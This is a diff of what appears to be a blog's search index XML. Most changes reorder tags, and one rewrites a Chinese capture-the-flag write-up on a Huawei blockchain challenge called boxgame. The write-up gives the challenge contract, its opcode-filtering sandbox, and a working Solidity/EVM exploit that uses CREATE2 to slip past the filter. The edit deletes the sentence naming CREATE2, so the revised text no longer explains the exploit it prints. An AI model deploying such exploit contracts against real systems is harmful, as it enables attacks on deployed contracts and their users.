@@ -118,8 +118,8 @@
         <category>🌟ctf2021</category>
       </categories>
       <tags>
-        <tag>🌟ctf2021</tag>
         <tag>Blockchain</tag>
+        <tag>🌟ctf2021</tag>
       </tags>
   </entry>
   <entry>
@@ -149,7 +149,7 @@
   <entry>
     <title><![CDATA[华为鲲鹏计算场区块链 boxgame]]></title>
     <url>%2F2020%2Fboxgame%2F</url>
-    <content type="text"><![CDATA[前言 华为鲲鹏计算场区块链题目 一个沙箱游戏，比较简单 Source 题目合约如下所示 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; constructor(bytes memory a) payable public &#123; assembly &#123; return(add(0x20, a), mload(a)) &#125; &#125; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; 构造函数中的真实合约如下 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; Analyse 合约的 constructor 函数中部署的合约才是真正的合约，所以分析构造函数里面的字节码即可 其实相当于一个沙盒，过滤了 f0 f1 f2 f4 fa ff 这些字节，即攻击合约中字节码不能出现这些字节，可以发现 f5 对应的 create2 没有被过滤，所以可用 create2 创建一个 emit ForFlag(0) 的合约，中间如果有禁止的字节，转换一下即可 Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859contract pikachu &#123; /* emit ForFlag(address(0)); 7F PUSH32 0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2 60 PUSH1 0x00 60 PUSH1 0x40 51 MLOAD 80 DUP1 82 DUP3 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 81 DUP2 52 MSTORE 60 PUSH1 0x20 01 ADD 91 SWAP2 50 POP 50 POP 60 PUSH1 0x40 51 MLOAD 80 DUP1 91 SWAP2 03 SUB 90 SWAP1 A1 LOG1 */ // 将上述字节码通过一些转换不包含f0 f1 f2 f4 fa ff即可 constructor() public payable &#123; assembly &#123; mstore(0x500, 0x7f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9) mstore(0x520, 0xe27f000000000010000000000000000000000000000000000100000000000000) mstore(0x540, 0x0000016000604051808273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee73) mstore(0x560, 0x1111111111111111111111111111111111111111011673eeeeeeeeeeeeeeeeee) mstore(0x580, 0xeeeeeeeeeeeeeeeeeeeeee731111111111111111111111111111111111111111) mstore(0x5a0, 0x0116815260200191505060405180910390a13460b26105003031f50000000000) return(0x500, 0x5c0) &#125; &#125;&#125;contract Hack &#123; BoxGame private constant target = BoxGame(0x4c3aa84018A031C11bE09e4b2dCC346Ae055956d); constructor() public payable &#123; bool result; // emit ForFlag(0) pikachu hack = new pikachu(); (result, ) = address(target).call(abi.encodeWithSelector( 0xc1803191, hack )); require(result); &#125;&#125; 直接部署 Hack 即可]]></content>
+    <content type="text"><![CDATA[前言 华为鲲鹏计算场区块链题目 一个沙箱游戏，比较简单 Source 题目合约如下所示 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; constructor(bytes memory a) payable public &#123; assembly &#123; return(add(0x20, a), mload(a)) &#125; &#125; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; 构造函数中的真实合约如下 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; Analyse 合约的 constructor 函数中部署的合约才是真正的合约，所以分析构造函数里面的字节码即可 其实相当于一个沙盒，过滤了 f0 f1 f2 f4 fa ff 这些字节，即攻击合约中字节码不能出现这些字节，可以创建一个 emit ForFlag(0) 的合约，中间如果有禁止的字节，转换一下即可 Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859contract pikachu &#123; /* emit ForFlag(address(0)); 7F PUSH32 0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2 60 PUSH1 0x00 60 PUSH1 0x40 51 MLOAD 80 DUP1 82 DUP3 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 81 DUP2 52 MSTORE 60 PUSH1 0x20 01 ADD 91 SWAP2 50 POP 50 POP 60 PUSH1 0x40 51 MLOAD 80 DUP1 91 SWAP2 03 SUB 90 SWAP1 A1 LOG1 */ // 将上述字节码通过一些转换不包含f0 f1 f2 f4 fa ff即可 constructor() public payable &#123; assembly &#123; mstore(0x500, 0x7f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9) mstore(0x520, 0xe27f000000000010000000000000000000000000000000000100000000000000) mstore(0x540, 0x0000016000604051808273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee73) mstore(0x560, 0x1111111111111111111111111111111111111111011673eeeeeeeeeeeeeeeeee) mstore(0x580, 0xeeeeeeeeeeeeeeeeeeeeee731111111111111111111111111111111111111111) mstore(0x5a0, 0x0116815260200191505060405180910390a13460b26105003031f50000000000) return(0x500, 0x5c0) &#125; &#125;&#125;contract Hack &#123; BoxGame private constant target = BoxGame(0x4c3aa84018A031C11bE09e4b2dCC346Ae055956d); constructor() public payable &#123; bool result; // emit ForFlag(0) pikachu hack = new pikachu(); (result, ) = address(target).call(abi.encodeWithSelector( 0xc1803191, hack )); require(result); &#125;&#125; 直接部署 Hack 即可]]></content>
       <categories>
         <category>Solidity</category>
       </categories>
@@ -644,9 +644,9 @@
         <category>Solidity</category>
       </categories>
       <tags>
-        <tag>Blockchain</tag>
         <tag>RoarCTF2019</tag>
         <tag>CoinFlip</tag>
+        <tag>Blockchain</tag>
       </tags>
   </entry>
   <entry>
@@ -657,8 +657,8 @@
         <category>Solidity</category>
       </categories>
       <tags>
-        <tag>Blockchain</tag>
         <tag>Solidity</tag>
+        <tag>Blockchain</tag>
         <tag>Smart Contract</tag>
         <tag>数字经济云安全</tag>
       </tags>
@@ -684,8 +684,8 @@
         <category>Solidity</category>
       </categories>
       <tags>
-        <tag>Blockchain</tag>
         <tag>Solidity</tag>
+        <tag>Blockchain</tag>
         <tag>Smart Contract</tag>
         <tag>N1CTF2019</tag>
       </tags>
